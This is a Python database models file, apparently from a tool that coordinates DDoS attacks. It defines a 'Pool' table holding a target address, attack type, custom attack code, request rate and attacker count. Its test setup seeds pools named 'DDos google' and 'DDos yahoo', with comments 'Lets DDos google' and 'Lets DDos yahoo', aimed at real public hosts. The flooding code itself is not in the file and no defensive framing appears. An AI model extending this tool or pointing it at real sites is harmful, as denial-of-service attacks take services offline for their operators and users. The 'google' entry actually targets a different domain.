from app import db
from datetime import datetime


class Pool(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    name = db.Column(db.String(64), index=True, unique=False)
    target_address = db.Column(db.String(128), index=True, unique=False)
    attack_type = db.Column(db.String(64), index=True, unique=False)
    custom_code = db.Column(db.Text(), index=True, unique=False, default=None)
    wasm = db.Column(db.Boolean(), unique=False, default=False)
    transport_layer = db.Column(db.String(128), index=True, unique=False, default='TCP')
    request_method = db.Column(db.String(32), index=True, unique=False, default='GET')   # GET", "POST", "PUT", "DELETE"
    port = db.Column(db.Integer(), index=True, unique=False)
    attack_message = db.Column(db.String(128), index=True, unique=False, default=None)
    comment = db.Column(db.String(140), index=True, unique=False)
    rpm = db.Column(db.Integer(), index=True, unique=False, default=0)
    timestamp = db.Column(db.DateTime, index=True, default=datetime.utcnow)
    number_attackers = db.Column(db.Integer(), index=True, unique=True, default=0)

    def __repr__(self):
        return f'{self.id}, {self.name}'


def init_test():
    db.create_all()
    a = Pool(name='DDos google', target_address='ftp://www.shrugvideo.fun',
     port=80, transport_layer='TCP', attack_type='DDOS', comment='Lets DDos google',
     attack_message='test', request_method='GET')
    db.session.add(a)

    u = Pool(name='DDos yahoo', target_address='http://www.yahoo.com',
     port=80, transport_layer='TCP', attack_type='DDOS', comment='Lets DDos yahoo',
     attack_message='test', request_method='GET')
    db.session.add(u)
    db.session.commit()

def reset_attack_num():
    """reset number of attacker for all the Pools"""
    pools = Pool.query.all()
    for pool in pools:
        pool.number_attackers = 0
    db.session.commit()
